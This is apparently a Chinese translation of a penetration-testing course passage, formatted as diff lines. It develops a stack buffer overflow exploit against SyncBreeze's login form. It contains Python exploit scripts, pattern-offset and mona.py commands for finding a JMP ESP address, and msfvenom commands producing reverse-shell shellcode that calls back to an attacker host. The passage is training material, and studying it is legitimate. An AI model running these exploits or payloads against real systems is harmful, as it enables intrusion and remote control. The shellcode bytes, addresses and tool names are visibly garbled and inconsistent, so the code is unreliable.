+最后，`CFG` 是微软对控制流完整性的实现，它可以防止间接代码分支被覆盖，防止函数指针被覆盖。
+
+我们幸运的是，SyncBreeze 软件在编译时没有开启 `DEP`、`ASLR` 或 `CFG` 支持，这使得利用过程变得简单得多，因为我们不需要绕过甚至担心这些安全机制。
+
+## 复现崩溃
+
+根据我们的模糊器，我们可以假设当在登录期间通过 HTTP 请求提交长度为 800 字节的用户名时，SyncBreeze 可能受到缓冲区溢出漏洞。我们在利用过程中的第一个任务是编写一个简单的脚本来复现我们的崩溃，而不需要每次运行模糊器。我们的新脚本看起来像列表 345 中的所示：
+
+
+
+```python
+#!/usr/bin/python
+import socket
+
+try:
+    print "Sending buffer..."
+
+    size = 800
+
+    inputBuffer = "A" * size
+
+    content = "username=" + inputBuffer + "&password="
+
+    buffer = "POST /login HTTP/1.1\r\n"
+    buffer += "Host: 10.1.0.22\r\n"
+    buffer += "User-Agent: Mozilla/5.0 (Linux; x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+    buffer += "Accept: text/html,application/xml,application/xml;q=0.9,*/*q=0.8\r\n"
+    buffer += "Accept-Language: en-US,q=0.5\r\n"
+    buffer += "Referer: http://10.1.0.2/login\r\n"
+    buffer += "Connection: close\r\n"
+    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+    buffer += "Content-Length: " + str(len(content)) + "\r\n"
+    buffer += "\r\n"
+    buffer += content
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("10.1.0.22", 80))
+    s.send(buffer)
+    s.close()
+    print "Done!"
+except:
+    print "Could not connect!"
+```
+
+### 列表 345 - 复现缓冲区溢出
+
+执行此脚本时，它会创建一个与我们之前观察类似的访问违规。换句话说，我们能够持续地复现崩溃。这是第一步。
+
+## 11.2.3 控制 EIP
+
+在利用内存损坏时，获取 `EIP` 寄存器的控制是关键。`EIP` 寄存器类似于指针；可以使用它来控制应用程序的方向或流。然而，在此时，我们只知道我们的由 `A` 组成的缓冲区中某个未知部分覆盖了 `EIP`，如图 213 所示：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_377_0.png)
+
+图 213：`EIP` 被 `A` 覆盖
+
+在我们将有效的目标地址加载到指令指针并执行之前，我们需要确切知道缓冲区的哪部分落入了 `EIP`。
+
+实现这一点有两种常用方法。首先是二进制分析。我们不需要 800 个 `A`，我们需要 400 个 `A` 和 400 个 `B`。如果 `EIP` 被 `B` 覆盖，我们就知道这四个字节位于缓冲区的后半部分。然后我们将 400 个 `B` 更改为 200 个 `B` 和 200 个 `C`，并再次发送缓冲区。如果 `EIP` 被 `C` 覆盖，我们就知道那四个字节在 600-800 字节范围内。继续分割缓冲区直到达到覆盖 `EIP` 的精确四个字节。数学上，这应该发生在七次迭代中。然而，有一种更快的方法来识别这四个字节。我们可以使用足够长的非重复字节字符串作为模糊输入。然后，当 `EIP` 被字符串中的四个字节覆盖时，可以使用它们的唯一序列来确定位置。这起初可能稍难理解，在使用该技术时会变得清晰。
+
+我们将使用 Metasploit 的 `pattern_create.rb` 脚本来实现这种方法。`pattern_create.rb` 脚本位于 `/usr/share/metasploit-framework/tools/exploit/`，但在 Kali 的任何位置通过运行 `msf-pattern-create` 即可，如下所示：
+
+```bash
+kali@kali: $ locate pattern-create
+usr/bin/msf-pattern-create
+usr/share/metasploit-framework/tools/exploit/pattern-create.rb
+
+kali@kali: $ msf-pattern-create -h
+Usage: msf-pattern-create [options]
+Example: msf-pattern-create -l 50 -s ABC,def,123
+Ad1Ad2Ad3Ad4Ae1Ae2Ae3fB1f
+```
+
+```bash
+```
+
+选项：
+
+- `-l`, `--length>`
+- `-s`, `--set <ABC,def,123>`
+- `-h`, `--help`
+
+列表 346 - `msf-pattern-create` 的位置和帮助
+
+为了创建我们选择的字符串，我们使用 `-l` 参数，该参数定义了所需字符串的长度（800）。
+
+```bash
+kali@kali: $ msf-pattern-create -l 800
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9AF0AF1AF2AF3AF4AF5AF6AF7AF8AF9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9A10A11A12A13A14A15A16
+```
+
+列表 347 - 带有唯一字符串的缓冲区
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+当我们等待 SyncBreeze 并再次运行利用程序时，我们注意到 `EIP` 包含一个新的字符串，与图 214 所示的字符串类似：
+
+```
+Registers (FPU)
+EAX 00000001
+ECX 0002F1EC
+EDX 0000035B
+ESI 00000000
+ESP 0122746A ASCII "2Ba3Ba4BaBa"
+EBP 00287B56 ASCII "login"
+EDI 0000266E
+EBP 014411E0
+EIP 42306142
+```
+
+图 214：`EIP` 被覆盖
+
+`EIP` 寄存器已被覆盖为 `42306142`，这是四个字符 "B0AB" 的十六进制表示。已知这一点，我们使用 `pattern_create.rb` 的伴侣工具 `pattern_offset.rb` 来确定这四个特定字节在字符串中的偏移量。在 Kali 中，此脚本可以在任何位置通过 `msf-pattern-offset` 运行。
+
+为了找到 `EIP` 覆盖发生的偏移量，我们使用 `-l` 指定原始字符串的长度（在本例中为 800），并使用 `-q` 指定我们在字符串中找到的字节。在 Kali 中 (`EIP(42306142)`)：
+
+```
+kal@kali~$ msf-pattern-offset -l 800 -q 42306142
+[*] Exact match at offset 780
+```
+
+列表 349 - 寻找偏移量
+
+`msf-pattern-offset` 脚本报告这四个字节位于 800 字节模式的偏移 780 处。让我们将其转换为修改后的缓冲区字符串，看看我们是否能让四个 `B` (`0x42424242`) 精确落在 `EIP` 寄存器中：
+
+```python
+#!/usr/bin/python
+import socket
+
+try:
+ print("\nSending evil buffer...")
+
+filler = "A" * 780
+eip = "B" * 4
+buffer = "C" * 16
+
+inputBuffer = filler + eip + "&password=A"
+
+content = "username=" + inputBuffer + "&password=A"
+...
+```
+
+列表 350 - 更新的缓冲区字符串
+
+这次，Web 服务器崩溃了，结果结构正确，且 `EIP` 现在包含了我们的四个 `B` (`0x42424242`)，如图 215 所示：
+
+图 25：受控制的 `EIP`
+
+我们现在控制了 `EIP`，并将将能够有效地执行 Sync2 的执行！然而，我们需要替换 `0x42424242` 占位符，并重定向到我们想要执行的有效地址。
+
+## 11.2.3.1 练习
+
+-. 编写一个独立脚本来复制崩溃。
+- 确定输入值中的偏移量以成功控制 `EIP`。
+- 更新你的独立脚本，放置一个唯一值以确保你的偏移量是正确的。
+
+## 11.2.4 为我们的 Shellcode 寻找空间
+
+此时，我们知道可以在 `EIP` 中放置任意地址，但我们不知道应该使用哪个真实地址。然而，在理解我们可以在哪里重定向执行流之前，我们无法选择地址。因此，我们将首先关注想要执行的可执行文件，更重要的是，要确保这段代码能够放入内存中。
+
+
+
+理想情况下，我们希望目标执行我们选择的某些代码，一个反向 shell（reverse shell）。我们可以将此类 shellcode 作为触发崩溃的输入缓冲区的一部分。
+
+> `Shellcode` 是一系列指令，执行时会执行攻击者期望的操作。这通常是打开一个反向 shell 或绑定 shell（bind shell），并可能包括更复杂的操作。
+
+我们将使用 `Metasploit Framework` 生成 `shellcode`。回看图 25 中崩溃后的寄存器，注意到 `ESP` 指向了我们的缓冲区（C's）。由于我们可以通过 `ESP` 存储的地址轻松访问该位置，这似乎是存放 `shellcode` 的方便位置。仔细检查崩溃情况（列表 351），发现缓冲区中的前四个 C 落在 `0x01307460`，而 `ESP` 指向缓冲区中的后续四个 C：
+
+| 地址 | 值 |
+| :--- | :--- |
+| 01307444 | 41414141 AAAA |
+| 01307448 | 41414141 AAAA |
+| 0130744C | 41414141 AAAA |
+| 01307450 | 41414141 AAAA |
+| 01307454 | 41414141 AAAA |
+| 01307458 | 41414141 AAAA |
+| 0130745C | 42424242 BBBB |
+| 01307460 | 43434343 CCCC |
+| 01307464 | 43434343 CCCC |
+| 01307468 | 43434343 CCCC |
+| 0130746C | 43434343 CCCC |
+| 01307470 | 00000000 |
+| 01307474 | 00000000 |
+
+列表 351 - `ESP` 指向 C's
+
+根据经验，我们知道一个危险的反向 shell 需要大约 350-400 字节的空间。然而，列表显示只有十六个，对于我们的 `shellcode` 来说是不够的。解决问题的简单方法是将利用程序的缓冲区从 800 字节增加到 1500 字节，看看是否能在不破坏缓冲区溢出或改变崩溃性质的情况下为 `shellcode` 提供足够的空间。
+
+> 根据应用程序和类型，可能会限制输入。在某些情况下，增加缓冲区会导致完全不同的崩溃，因为较大的缓冲区覆盖了目标使用的额外数据。
+
+对于这次更新，我们将添加 'D' 字符作为 `shellcode` 的占位符：
+
+```python
+filler = "A" * 780
+eip = "B" * 4
+offset = "C" * 4
+buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
+inputBuffer = filler + eip + offset + buffer
+...
+```
+
+列表 352 - 更新的用户名 字符串
+
+一旦发送了新的更长的缓冲区，可以在调试器中观察到类似的崩溃。然而，这次我们发现 `ESP` 指向一个不同的地址值 `0x030E745C`，如图 216 所示：
+
+```
+Registers (FPU)
+EAX 00000001
+ECX 00554356
+EDX 00000352
+EBX 00000000
+EBP 00554342 ASCII "0000000000000000"
+ESP 0045A4B6 ASCII "login"
+EDI 00BC0C78
+EIP 42244242
+```
+
+图 26：栈空间增加
+
+因此，`ESP` 指向 D 字符（十六进制的 `0x44`），作为我们 `shellcode` 的占位符：
+
+```
+030E7448 41414141 AAAA
+030E744C 41414141 AAAA
+030E7450 41414141 AAAA
+030E7454 42244242 BBBB
+030E7458 43434343 CCCC
+030E745C 44444444 DDDD
+030E7460 44444444 DDDD
+030E7464 44444444 DDDD
+030E7468 44444444 DDDD
+030E746C 44444444 DDDD
+...
+0300E745C 44444444 DDDD
+```
+
+列表 353 - 为 `shellcode` 增加的栈空间
+
+这个小技巧为我们提供了更多的工作空间。通过进一步检查，我们发现 `shellcode` 共有 704 字节 (`0x030771C-0x030745C`) 的空闲空间。此外，请注意地址每次运行利用程序时都会变化，但仍然指向缓冲区。我们将在后续章节中解决这个问题，但我们还有另一个障碍：
+
+## 11.2.5 检查坏字符
+
+根据应用程序，某些字符是“坏的”，不应放在缓冲区中。缓冲区中一个常见的坏字符是空字节 (`0x0`)，因为它用于终止字符串。此外，由于我们将利用程序作为 POST 请求的一部分发送，应该避免 `0x0D`，它表示字段的结束。
+
+丰富的开发者会通过发送从 `0x00` 到 `0xFF` 的所有字符来检查哪些是坏字符，并查看应用程序如何处理。这样做，我们将重用概念并将 D 替换为所有可能的十六进制字符：
+
+```python
+#!/usr/bin/python
+import socket
+
+badchars = (
+"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
+"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
+"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
+"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
+"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
+"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
+"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
+"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8c\x8d\x8e\x8f"
+"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
+"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
+"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xca\xcb\xcc\xcd\xce\xf"
+"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
+)
+
+try:
+    print("Sending exploit buffer...")
+    filler = "A" * 780
+    eip = "B" * 4
+    offset = filler + eip + badchars
+    inputBuffer = "username=" + inputBuffer + "&password=A"
+    content = "username=" + inputBuffer + "&password=A"
+```
+
+列表 354 - 包含所有十六进制字符的脚本
+
+在概念证明之后，我们可以右键点击 `ESP` 并选择“在转储文件中跟踪”（Follow in Dump），显示内存中的输入缓冲区十六进制字符（列表 355）：
+
+| 地址 | 值 |
+| :--- | :--- |
+| 032674c4 | 41414141 AAAA |
+| 0326745a | 42424242 BBBB |
+| 0326745c | 0102030405060708 |
+| 03267469 | 090003009B0C03 |
+| 0326746l | 106C040086000000 |
+| 03267474 | 18AB26030000000 |
+
+列表 355 - 在栈上截断
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+```
+01B174C 41 41 41 41 41 41 41 AAAAAAA
+01B1745 42 42 42 42 43 43 43 BBBBBCC
+01B174C 01 02 03 04 05 06 07 00 ...8¦Ì
+01B1764 09 08 0C 00 38 BD CE 00
+01B1746 10 6C 0F 00 08 06 00 00 L...
+01B1747 18 AB 01 01 09 09 00 00 =+....
+```
+
+
+
+通过这种方式，我们发现尝试溢出目标缓冲区时，`0x00`、`0x0D`、`0x25`、`0x26`、`0x2B` 和 `0x3D` 会破坏我们的输入缓冲区。
+
+## 11.2.5.1 练习
+
+- 1. 按照顺序重复步骤，识别无法包含在负载（payload）中的坏字符（bad characters）。
+
+- 2. 为什么这些字符不允许？这些坏十六进制字符是如何转换为 ASCII 的？
+
+## 11.2.6 重定向执行流
+
+此时，我们已经控制了 `EIP` 寄存器，并且知道我们可以通过 `ESP` 寄存器轻松访问的内存空间找到我们的 shellcode。我们还知道哪些字符对我们的缓冲区是安全的，哪些是不安全的。我们的下一个任务是找到一种方法将执行流重定向到崩溃时 `ESP` 寄存器指向的内存地址处的 shellcode。
+
+最直观的方法是尝试将 `B` 替换为崩溃时弹出 `ESP` 寄存器的地址。然而，正如我们之前提到的，`ESP` 的值会随崩溃而变化。栈地址经常变化，尤其是在像 `SyncBrowse` 这样的多线程应用程序中，因为每个线程都有操作系统分配的内存保留区域。
+
+因此，硬编码栈地址并不是到达我们缓冲区的可靠方法。
+
+## 11.2.7 寻找返回地址
+
+我们仍然可以将 shellcode 存储在 `ESP` 指向的地址，但我们需要一种一致的方法来执行该代码。一种解决方案是使用 `JMP ESP` 指令，正如名称所示，它在执行时会“跳转”到 `ESP` 指向的地址。如果我们找到一个包含此指令的可靠静态地址，我们就可以将 `EIP` 重定向到该地址，并在崩溃时，`JMP ESP` 指令将被执行。这种“间接跳转”将执行流引向我们的 shellcode。
+
+Windows 中的许多库都包含此常用指令，但我们需要找到一个符合某些标准的引用。首先，库中使用的地址必须是静态的，这排除了没有编译 `ASLR` 支持的库，否则会破坏漏洞，因为该地址将成为我们输入缓冲区的一部分。
+
+### 使用 Kali Linux 2.0 进行渗透测试
+
+我们可以使用由 `Corelan` 团队开发的 `Immunity Debugger` 脚本 `mona.py`¹¹ 开始搜索返回地址。首先，我们将使用 `!mona modules` 请求由 `SyncBridge` 加载到进程内存空间的所有 `DLL`（或模块）的信息，产生如图 217 所示的输出：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_385_0.png)
+
+> 图 217：`mona modules` 命令输出
+
+此输出中的列包括当前内存位置（基地址和顶部地址）、模块大小、多个标志位、模块版本、名称和路径。
+
+从此输出的标志位中，我们可以看到 `sync.exe` 有 `SafeSEH`¹⁰（结构化异常处理覆盖，一种利用技术）、`ASLR` 和 `NX`（`DEP` 已禁用）。换句话说，可执行文件没有编译任何内存保护方案，并且始终在基地址 `0x04000000` 加载，这意味着所有指令（`0XXXX`）将包含空字符，这不适合我们的缓冲区¹¹（Corelan, 2019），https://github.com/corelan/mona¹⁰（Microsoft, 2016），docs.microsoft.com/en-us/reference/safeseh-exception-handlers?view=vs-2015 PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 386
+
+### 使用 Kali Linux 2.0 进行渗透测试
+
+遍历输出，发现 `sync.DLL` 也符合我们的需求。现在我们需要找到该模块中自然出现的 `JSP` 指令地址。
+
+> 高级提示：如果此应用程序编译了 `DEP` 支持，你的 `ESP` 地址将位于模块的 `.text` 段，因为那是唯一同时具有读 (`R`) 和可执行 (`E`) 权限的段。然而，由于 `DEP` 未启用，我们可以使用该模块中的任何地址。
+
+可以使用 `Immunity Debugger` 中的原生命令来搜索我们的 `JSP` 指令。我们可以使用 `mona.py` 对指令的十六进制表示（操作码）进行详尽搜索。找到 `JSP ESP` 的等效项，可以使用 `Metasploit NASM` 脚本 `msf-nasm_shell`，它产生了 357 所示的结果：
+
+```
+kali@kali: $ msf-nasm_shell
+jmp esp
+000000 FFE4
+```
+
+357 - 寻找 `JSP ESP` 的操作码
+
+我们可以使用 `mona.py` 在 `sync.DLL` 的所有部分搜索 `JSP ESP` 的操作码表示（`0FFE4`）。最终命令 `mona find -s "\xff4" -m sync.dll` 的输出如图 218 所示：
+
+```
+[+] Command used mona find -s "\xff4" -m sync.dll
+[+] Started on 2019-06-14 10:21:03
+[+] Arguments and criteria
+- Searching for modules in sync.dll
+- Only queuing modules into table, hang on...
+- Processing modules 
+- Treating pattern as bin
+- Searching for byte sequence at 0x22300
+[+] Creating output 'find.txt'
+[+] Matches of type "\xff4"
+[+] Writing results to find.txt
+[+] Number of pointers to: 1
+[+] Results: Found 1 pointer (PAGE_EXECUTE_READ)
+[+] mona.py action took 00:00:00.63
+```
+
+图 218：使用 `mona.py` 搜索操作码
+
+在本例中，输出显示了一个地址，且幸运的是，该地址不包含任何坏字符。PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 387
+
+为了在执行暂停时在反汇器中查看 `0x100c83` 的内容，我们将点击“转到反汇器”（Go to Disassembler）。从这里我们可以看到它翻译为 `JMP ESP` 指令![](img/f99f528ca9845f4c256ce54e882b1345_387_0.png)
+
+图 219：跳转到反汇器中的特定地址
+
+如果在崩溃时重定向 `EIP`，`JMP ESP` 指令将把执行流引向我们的 shellcode。我们可以通过更新原型代码中的 `EIP` 变量以反映此地址来测试这一点：
+
+```
+filler = "A" * 78
+eip = "\x83\xc0\x09\x10"
+offset = "C" * (1500 - len(filler))
+buffer = filler + eip + offset
+```
+
+358 - 重定向 `EIP`
+
+注意下面的地址是倒序的。这是因为操作系统可以使用不同的格式存储地址数据。通常情况下，存储地址的系统取决于架构。小端序（Little endian）是最广泛使用的格式，用于 `x86` 和 `AMD64` 架构，而大端序（big endian）历史上曾用于 `Spar` 和 `PowerPC`。在小端序中，低位字节存储在内存的最低地址，高位字节存储在最高地址。因此，我们必须在缓冲区中以倒序存储返回地址，以便 `CPU` 在内存中正确解释它。
+
+使用调试器，我们将在地址 `0x100c83` 处设置断点以跟踪 `JMP ESP` 指令的执行，然后再次运行我们的漏洞。结果如图 220 所示。
+
+> (Wikipedia, 2019), http://en.wikipedia.org/wiki/Endianness
+
+PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 388
+
+### 使用 Kali Linux 2.0 进行渗透测试
+
+```
+Immunity Debugger - sync.exe [ | | << | | thread 0000
+Registers EIP      00001A0
+ESP      0019F0
+EBP      0019F4
+EAX      0000000
+EBX      0000000
+ECX      0000000
+EDX      0000000
+ESI      0000000
+EDI      0000000
+EBP      0019F4
+ESP      0019F0
+EIP      00001A0
+FLAGS   00000246
+CS      0043
+DS      0000
+SS      0043
+ES      0000
+FS      0030
+GS      0000
+```
+
+图 220：`sync.dll` 中的 `JMP ESP` 断点
+
+我们的调试器显示我们到达了 `JMP ESP` 以及我们目前设置的断点。在调试器中按 `F7` 单步进入 shellcode，目前是一堆 `D`。
+
+太好了！现在我们需要生成有效的 shellcode，我们的漏洞就可以完成了。
+
+## 11.2.7 练习
+
+
+
+- 1. 找到漏洞中使用的 `JMP ESP`。
+- 2. 更新你的原型以包含发现的 `JMP ESP`，在其上设置断点并跟踪到占位符。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+| 名称 | 描述 |
+|---|---|
+| `aix/rfc/shell_bind_tcp` | 监听连接并启动命令 shell |
+| `aix/rfc/shell_find_port` | 在已建立的连接上启动 shell |
+| `aix/rfc/shell_interact` | 简单执行 `/bin/sh`（针对 inetd 程序） |
+| `aix/rfc/shell_reverse_tcp` | 连接回攻击者并启动命令 shell |
+
+## 列表 359 - 生成所有 Metasploit 负载的命令
+
+`msfvenom` 命令非常易用。我们使用 `-p` 生成一个名为 `windows/shell_reverse_tcp` 的负载，它的作用类似于一个 Netcat 反向 shell。该负载需要一个 `LHOST` 参数，用于定义 shell 的目标 IP 地址。还可以定义一个可选的 `LPORT` 参数来指定回连端口，我们将使用 `-f` 格式来获取 C 格式的 shell。
+
+生成我们 shellcode 的完整 `msfvenom` 命令如下：
+
+```
+kali@~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c
+No platform selected, choosing architecture: x86 from the payload
+No encoder or badly specified, outputting raw payload
+unsigned char *buffer = "\xfc\xf8\x82\x80\x00\x00\x68\x69\x65\x31\x53\x64\x61\x53\x30\x38\x31\x58\x52\x54\x52\x61\x74\x27\x28\x67\x74\xa4\x26\x31\xf2\xff\x61\x72\x61\x63\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28\x2c\x61\x71\x64\x28";
+```
+
+## 列表 360 - 通用 shellcode
+
+这看起来简单，但我们可以很容易识别 shellcode 生成的坏字符（如空字节）。当我们无法使用通用 shellcode 时，必须对其加密以适应目标环境。
+
+### 使用 Kali Linux 2.0 进行渗透测试
+
+我们将使用编码 `shikata_nai` 来加密我们的 shellcode，并使用 `-b` 选项告知坏字符。
+
+```
+msfvenom windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c -e x86/shakata_nai -b '\x00'
+No platform selected, choosing architecture: x86 from the payload
+No Arch selected, selecting Arch: the payload
+Found 2 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shakata_nai succeeded with 351 (iteration=0)
+```
+
+`unsigned char buf[] = {`
+
+
+
+\x35\x55\x66\x02\x\xd1\x73\x74\x24\x4f\x5a\x29\xc9\xb1
+
+\x52\x31\x72\x11\x03\x72\x21\x83\x91\x77\x51\x64\x57\x86\x02\x1a
+
+\xf8\x31\x73\xd8\x70\x86\x77\x63\x9c\x25\x6b\x67\x06\xcd1\x59
+
+\x77\x21\x78\x8a\x85\x6e\x6b\x53\x23\xd1\x78\x71\x86\x78\x64\x8d
+
+\xb2\x61\x6f\x74\xe6\xd1\x73\x61\x74\x73\x73\x7b\x63\x52\x2a\x94\x96
+
+\x74\xcd\x77\x93\xd3\x65\xc1\xb2\x73\x24\x55\xe9\x94\x89\x94\x64
+
+\x55\x55\x58\x8d\xb4\x87\x64\x88\x7c\x64\x65\xe5\x5f
+
+\x61\x30\x53\x81\x82\xd0\x61\xcd5\x91\xbd\x75\x81\x67\x84\x87\x77\x71
+
+1xxe1\x63\x63\x31\x36\x61\x68\x6b\x55\x51\x2a\x61\x71\x65\x31\xe8
+
+\x99\x15\x84\x52\x5f\x29\xf9\x61\x85\x95\x68\x29\x02\x63
+
+\x8e\x84\x4f\xf71\x71\x24\x85\x8a\x65\x84\x21\x4f\x7c\x37
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+空操作（Operation，简称 NOP）指令的机器码值为 `0x90`。正如其名所示，这些指令不做任何操作，只是将执行权传递给下一条指令。通过这种方式，这些指令也被定义为 NOP 滑块（NOP sled）或 NOP 滑动（NOP slide），它们会让 CPU “滑过”这些 NOP 指令直到到达有效负载（payload）。
+
+在这两种情况下，当执行到达 shellcode 解码器时，栈指针距离其足够远，以不至于在 GetPC 覆盖栈上的几个字节时损坏 shellcode。
+
+在添加了 NOP 滑块后，我们的漏洞利用程序看起来如列表 `362` 所示：
+
+```python
+#!/usr/bin/python
+
+import socket
+
+try:
+
+    print("exploding buffer...")
+```
+
+
+
+```
+shellcode = "(\xbe\x55\x5e\x61\x72\x6b\x02\x9a\xc9\x74\x24\xf4\xa5\xc9\xb1\x52\x51\x72\x72\x77\x71\x83\xe1\x54\x47\x65\x62\x02\x14\x14\xxf8\x38\xd31\x70\x71\x62\x62\x73\x74\x04\xc06\xdxd1\xd59\nxd7\x20\x61\x71\x71\x61\x65\x65\x83\xc9\x55\xd78\xf9\xd94\xf24\nxd7\x20\x65\x76\x61\x64\xc8\x61\x55\x52\x53\x24\x74\x74\x79\x73\xd61\x5c\xe0\xd71\x64\x54\x64\x09\xa6\xa4\xa4\n\x55\x87\x80\x84\x47\xb4\x78\x87\x58\x32\xe3\xca\x55\xf3\nxe3\x60\x83\x61\x81\x02\xcb\x72\x87\x71\x88\x95\x87\x95\x81\xd7\nxd64\x63\x6a\x63\x63\x71\x67\x68\x85\x51\x52\x96\x61\x39\x38\xb8\x80\x71\xe5\x57\x51\x22\xf4\x61\x71\x64\x65\x65\x54\x74\x74\x71\x71\x68\x61\x61\x61\x61\x71\x61\x61\x61\x61\x65\x65\x64\x65\x64\xd7\x39\xd8\x12\x90\xxd2\x61\x51\x61\x61\x61\x61\x61\x62\x61\x62\x62\x54\x74\x64\x64\x64\x64\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x6